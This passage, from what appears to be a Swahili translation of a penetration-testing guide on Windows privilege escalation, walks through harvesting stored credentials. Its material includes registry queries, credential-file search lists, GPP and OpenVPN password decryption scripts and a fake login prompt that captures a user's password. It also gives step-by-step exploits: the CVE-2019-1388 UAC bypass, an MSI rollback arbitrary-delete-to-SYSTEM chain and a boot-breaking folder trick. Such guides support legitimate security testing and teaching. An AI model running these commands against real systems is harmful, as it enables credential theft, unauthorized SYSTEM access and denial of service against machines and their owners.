reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, hivyo unapaswa kuangalia ikiwa kuna chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa SSH key iliyohifadhiwa. Limehifadhiwa likiwa limesimbwa kwa njia fiche, lakini linaweza kufafanuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu technique hii yanapatikana hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa service ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii si halali tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kupitia ssh kwenye mashine. Registry ya HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Faili zisizohudumiwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Nakala rudufu za SAM na SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Cached GPP Password

Hapo awali kulikuwa na feature iliyowezesha kusambaza custom local administrator accounts kwenye kundi la machines kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na security flaws kubwa. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama XML files kwenye SYSVOL, zingeweza kufikiwa na domain user yeyote. Pili, passwords zilizokuwa ndani ya GPP hizi, zikiwa encrypted kwa AES256 kwa kutumia default key iliyowekwa hadharani, zingeweza kudekriptiwa na authenticated user yeyote. Hili lilikuwa tishio kubwa, kwa kuwa lingewezesha users kupata elevated privileges.

Ili kupunguza hatari hii, function iliundwa kutafuta locally cached GPP files zenye field ya `"cpassword"` ambayo si tupu. Baada ya kupata file kama hilo, function hufanya decrypt ya password na kurudisha custom PowerShell object. Object hii inajumuisha details kuhusu GPP na location ya file, hivyo kusaidia kutambua na kurekebisha security vulnerability hii.

Tafuta kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa files hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kudekripti cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config wenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Vitambulisho vya OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kumbukumbu
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza daima **kumuomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unafikiri anaweza kuzijua (kumbuka kwamba **kumuuliza** mteja moja kwa moja kuhusu **credentials** ni **hatari sana**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **nywila** katika **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials ndani ya RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta credentials ndani yake

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Funguo nyingine zinazowezekana za registry zenye credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Browsers

Unapaswa kuangalia dbs ambako passwords kutoka **Chrome au Firefox** zimehifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers ili kuona kama baadhi ya **passwords zimehifadhiwa** humo.

Tools za ku-extract passwords kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni technology iliyojengwa ndani ya Windows operating system inayowezesha **intercommunication** kati ya software components za lugha tofauti. Kila COM component **inatambuliwa kupitia class ID (CLSID)** na kila component hutoa functionality kupitia interface moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface**, mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32**, ambayo ina default value inayoelekeza kwenye **DLL**, pamoja na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Browsers - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata child registry InProcServer32, ambayo ina default value inayoelekeza kwenye DLL, pamoja na value...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **overwrite DLL yoyote** itakayo-execute, unaweza **escalate privileges** ikiwa DLL hiyo ita-execute na user mwingine.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama persistence mechanism, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin niliyounda ili **kuendesha kiotomatiki kila metasploit POST module inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni tool nyingine bora ya kuchota nywila kutoka kwenye mfumo.

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za tools kadhaa zinazohifadhi data hii katika maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **a process running as SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **full access**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye low privileges lakini ikirithi open handles zote za main process**.\
Kisha, ikiwa una **full access kwenye low privileged process**, unaweza kuchukua **open handle ya privileged process iliyoundwa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **post hii nyingine kwa maelezo kamili zaidi kuhusu jinsi ya ku-test na kutumia vibaya open handlers zaidi za processes na threads zilizorithiwa zikiwa na viwango tofauti vya permissions (si full access pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, zinazojulikana kama **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows hutoa feature inayoitwa **Named Pipes**, inayoruhusu processes zisizohusiana kushiriki data, hata kupitia networks tofauti. Hii inafanana na architecture ya client/server, yenye roles zinazojulikana kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe hiyo inaweza **kujifanya kuwa** **client**, ikiwa ina rights zinazohitajika za **SeImpersonate**. Kutambua **privileged process** inayowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata privileges za juu zaidi** kwa kutumia identity ya process hiyo inapoingiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio kama hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia tool ifuatayo inaruhusu **ku-intercept named pipe communication kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) ikiwa katika server mode hu-expose `\\pipe\\tapsrv` (MS-TRP). Remote authenticated client anaweza kutumia vibaya mailslot-based async event path ili kubadilisha `ClientAttach` kuwa **4-byte write** hole kwa file yoyote iliyopo na inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata Telephony admin rights na kupakia DLL yoyote kama service. Mtiririko kamili:

- `ClientAttach` ikiwa na `pszDomainUser` iliyowekwa kuwa path iliyopo na inayoweza kuandikwa → service huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa async event writes.
- Kila event huandika `InitContext` inayodhibitiwa na attacker kutoka `Initialize` kwenda kwenye handle hiyo. Sajili line app ukitumia `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch kupitia `GetAsyncEvents` (`Req_Func 0`), kisha unregister/shutdown ili kurudia writes zinazotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, reconnect, kisha uite `GetUIDllName` ikiwa na arbitrary DLL path ili ku-execute `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### File Extensions that could execute stuff in Windows

Tembelea ukurasa wa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Markdown links zinazoweza kubonyezwa na ku-forwardiwa kwa `ShellExecuteExW` zinaweza ku-trigger URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na ku-execute files zinazodhibitiwa na attacker kama user wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazo-execute na **kupitisha credentials kwenye command line**. Script iliyo hapa chini huchukua command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa differences zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba passwords kutoka kwenye processes

## Kutoka kwa Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una access kwenye graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na privileges.

Hii huwezesha kufanya privilege escalation na kubypass UAC kwa wakati mmoja kwa kutumia vulnerability hiyo hiyo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato huo imesainiwa na kutolewa na Microsoft.

Baadhi ya systems zilizoathiriwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika blog post hii**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hili kimsingi linatumia vibaya rollback feature ya Windows Installer ili kubadilisha files halali na zenye malicious wakati wa mchakato wa uninstallation. Kwa hili, mshambulizi anahitaji kuunda **malicious MSI installer** itakayotumika kuhijack folder ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa ku-uninstall MSI packages nyingine, ambapo rollback files zitakuwa zimebadilishwa ili kuwa na malicious payload.

Mbinu iliyofupishwa ni hii:

1. **Stage 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Step 1: Install MSI
- Unda `.msi` inayosakinisha file lisilo na madhara (kwa mfano, `dummy.txt`) katika folder linaloweza kuandikwa (`TARGETDIR`).
- Weka installer kuwa **"UAC Compliant"**, ili **non-admin user** aweze kuiendesha.
- Weka **handle** ikiwa wazi kwa file baada ya installation.

- Step 2: Begin Uninstall
- Uninstall `.msi` hiyo hiyo.
- Mchakato wa uninstall huanza kuhamisha files hadi `C:\Config.Msi` na kuyapa majina mapya ya files za `.rbf` (rollback backups).
- **Poll open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua file linapokuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Hutoa signal wakati `.rbf` imeandikwa.
- Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Step 4: Zuia Deletion ya `.rbf`
- Unapopokea signal, **fungua file la `.rbf`** bila `FILE_SHARE_DELETE` — hii **hulizuia lisifutwe**.
- Kisha **toa signal kurudi** ili uninstall ikamilike.
- Windows Installer inashindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta contents zote, `C:\Config.Msi` haiondolewi.

- Step 5: Futa `.rbf` Manually
- Wewe (mshambulizi) futa file la `.rbf` manually.
- Sasa **`C:\Config.Msi` ni tupu**, likiwa tayari kuhijack.

> Katika hatua hii, **trigger SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha Rollback Scripts na Zilizo Malicious**

- Step 6: Unda Upya `C:\Config.Msi` yenye Weak ACLs
- Unda upya folder la `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (kwa mfano, Everyone:F), na **weka handle ikiwa wazi** ikiwa na `WRITE_DAC`.

- Step 7: Run Installation Nyingine
- Install `.msi` tena, ikiwa na:
- `TARGETDIR`: Location inayoweza kuandikwa.
- `ERROROUT`: Variable inayosababisha failure ya lazima.
- Installation hii itatumika ku-trigger **rollback** tena, ambayo inasoma `.rbs` na `.rbf`.

- Step 8: Monitor kwa `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapoonekana.
- Hifadhi filename yake.

- Step 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Hutoa signal ya event wakati `.rbs` inaundwa.
- Kisha **husubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **hutumia tena strong ACLs** kwenye `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kutumia tena weak ACLs**.

> ACLs **hutekelezwa tu wakati wa kufungua handle**, kwa hivyo bado unaweza kuandika kwenye folder.

- Step 11: Weka Fake `.rbs` na `.rbf`
- Overwrite file la `.rbs` kwa **fake rollback script** inayoiambia Windows:
- Irejeshe file lako la `.rbf` (malicious DLL) kwenye **privileged location** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weka fake `.rbf` yako iliyo na **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger Rollback
- Toa signal ya sync event ili installer iendelee.
- **Type 19 custom action (`ErrorOut`)** imewekwa ili **ishindwe kwa makusudi installation** katika hatua inayojulikana.
- Hii husababisha **rollback kuanza**.

- Step 13: SYSTEM Installs DLL Yako
- Windows Installer:
- Husoma malicious `.rbs` yako.
- Hunakili `.rbf` DLL yako hadi target location.
- Sasa una **malicious DLL yako katika SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Endesha **trusted auto-elevated binary** (kwa mfano, `osk.exe`) inayopakia DLL uliyo hijack.
- **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyoelezwa hapo awali) inadhania kwamba unaweza kufuta **folder zima** (kwa mfano, `C:\Config.Msi`). Lakini je, vulnerability yako inaruhusu tu **arbitrary file deletion** ?

Unaweza kutumia vibaya **NTFS internals**: kila folder lina hidden alternate data stream inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta **stream ya `::$INDEX_ALLOCATION`** ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako haikuruhusu kufuta files/folders kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na attacker**?

1. Hatua ya 1: Weka bait folder na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati privileged process inapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock triggers** na kumpa udhibiti callback yako.

4. Hatua ya 4: Ndani ya oplock callback – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii huacha `folder1` ikiwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — kufanya hivyo kungeachilia oplock kabla ya wakati.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folder — kuifuta kunafuta folder.

5. Hatua ya 5: Release the oplock
- SYSTEM process inaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Uundaji wa Folda ya Kiholela hadi DoS ya Kudumu

Tumia primitive inayokuruhusu **kuunda folda ya kiholela kama SYSTEM/admin** — hata kama **huwezi kuandika mafaili** au **kuweka permissions dhaifu**.

Unda **folda** (si faili) yenye jina la **Windows driver muhimu**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiunda **mapema kama folder**, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Inaona folder, **inashindwa kutatua driver halisi**, na **hu-crash au kusimamisha kuwasha**.
- Hakuna **fallback**, wala **recovery** bila uingiliaji wa nje (kwa mfano, boot repair au ufikiaji wa disk).

### Kutoka kwenye njia za privileged log/backup + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati **privileged service** inaandika logs/exports kwenye njia inayosomwa kutoka kwenye **writable config**, elekeza njia hiyo upya kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha privileged write kuwa arbitrary overwrite (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi target path inaweza kuandikwa na attacker (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwenda `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privileged operation inayoandika kwenye njia hiyo (log, export, report).

